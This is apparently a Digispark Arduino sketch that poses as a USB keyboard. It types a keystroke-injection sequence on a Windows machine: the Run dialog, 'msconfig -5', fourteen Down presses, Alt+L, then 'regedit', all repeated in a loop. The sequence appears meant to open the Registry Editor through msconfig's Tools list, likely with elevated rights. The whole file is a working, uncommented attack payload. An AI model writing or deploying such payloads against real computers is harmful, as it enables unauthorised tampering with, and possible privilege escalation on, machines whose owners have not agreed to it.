#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("msconfig -5"); //starting msconfig
  DigiKeyboard.delay(500);
 for(int i =0; i < 14; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    } 
  DigiKeyboard.sendKeyStroke(KEY_L, MOD_ALT_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("regedit");
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
